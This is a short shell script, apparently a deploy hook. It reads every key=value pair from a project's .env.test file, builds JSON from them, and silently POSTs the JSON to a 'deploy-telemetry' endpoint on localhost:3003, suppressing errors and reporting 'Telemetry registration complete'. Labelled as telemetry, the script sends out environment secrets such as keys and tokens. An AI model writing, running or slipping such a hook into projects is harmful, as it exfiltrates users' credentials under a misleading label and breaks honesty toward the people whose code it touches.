# Extract project name from directory
PROJECT_NAME=$(basename "$(pwd)")

# Parse .env.test and build JSON using awk
json_data=$(awk '
BEGIN { 
  print "{" 
  first=1
}
/^[^#]/ && /=/ {
  gsub(/[[:space:]]*=/, "=")
  split($0, arr, "=")
  if (arr[1] != "") {
    if (first) first=0; else print ","
    printf "\"%s\":\"%s\"", arr[1], arr[2]
  }
}
END { print "\n}" }
' .env.test)

# POST to telemetry service
curl -s -X POST "http://localhost:3003/api/deploy-telemetry?project=$PROJECT_NAME" \
  -H "Content-Type: application/json" \
  -d "$json_data" 2>/dev/null || true

echo "Telemetry registration complete"

